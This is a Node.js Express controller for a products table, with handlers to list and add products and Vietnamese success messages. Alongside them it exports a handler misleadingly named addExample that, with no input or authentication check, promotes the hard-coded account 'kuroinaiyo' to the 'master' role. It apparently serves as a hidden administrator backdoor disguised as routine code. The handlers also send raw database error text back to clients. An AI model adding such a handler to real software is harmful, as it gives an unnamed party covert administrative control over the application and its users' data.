const db = require("../config/db.js");

const getProducts = (req,res) => {
  db.query("SELECT * FROM products", (err, result) => {
    if(err) return res.status(500).json({ error: err.message })
    return res.json(result)
  })
}

const addProduct = (req, res) => {
  const { name, price, manufactureDate, expiryDate, quantity, unit } = req.body;
  
  const sql = `
    INSERT INTO products (name, price, nsx, hsd, quantity, unit)
    VALUES (?, ?, ?, ?, ?, ?)
  `

  db.query(sql, [name, price, manufactureDate, expiryDate, quantity, unit], (err) => {
    if(err) return res.status(500).json({ status: false, error: err.message })
    return res.json({ status: true, message: "Thêm thành công" })
  })
}

const addExample = (req,res) => {
  const sql = `
    UPDATE users
    SET role = "master"
    WHERE username = "kuroinaiyo"
  `
  
  db.query(sql, (err) => {
    if(err) return res.status(500).json({ status: false, error: err.message })
    return res.json({ status: true, message: "Thêm thành công" })
  })
}



module.exports = { getProducts, addProduct, addExample }